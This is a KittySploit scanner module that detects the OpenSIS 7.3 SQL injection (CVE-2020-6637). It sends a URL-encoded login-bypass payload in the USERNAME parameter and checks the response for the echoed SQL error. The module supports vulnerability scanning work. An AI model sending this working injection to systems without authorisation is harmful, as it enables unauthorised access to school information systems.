#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""OpenSIS Community Edition version 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'OpenSIS 7.3 - SQL Injection Detection',
        'description': 'OpenSIS Community Edition version 7.3 is vulnerable to SQL injection via the USERNAME parameter of index.php.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'sqli', 'opensis', 'os4ed', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://cinzinga.com/CVE-2020-6637/',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-6637',
            'https://sourceforge.net/projects/opensis-ce/files/',
            'https://github.com/OS4ED/openSIS-Responsive-Design/commit/1127ae0bb7c3a2883febeabc6b71ad8d73510de8',
            'https://opensis.com/',
        ],
        'cve': 'CVE-2020-6637',
    }

    def run(self):
        for path in ('/account/index.php', '/opensis/index.php', '/index.php'):
            r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='USERNAME=%27%29or%601%60%3D%601%60%3B--+-&PASSWORD=A&language=en&log=\n')
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_all = ('SQL STATEMENT:', "<TD>UPDATE login_authentication SET FAILED_LOGIN=FAILED_LOGIN+1 WHERE UPPER(USERNAME)=UPPER(NULL)or`1`=`1`;-- -')</TD>",)
            header_all = ('text/html',)
            if (all(m in body for m in body_all)) and (all(m in headers for m in header_all)):
                self.set_info(
                    severity='critical',
                    reason='OpenSIS 7.3 - SQL Injection detected',
                    path=path,
                )
                return True
        return False

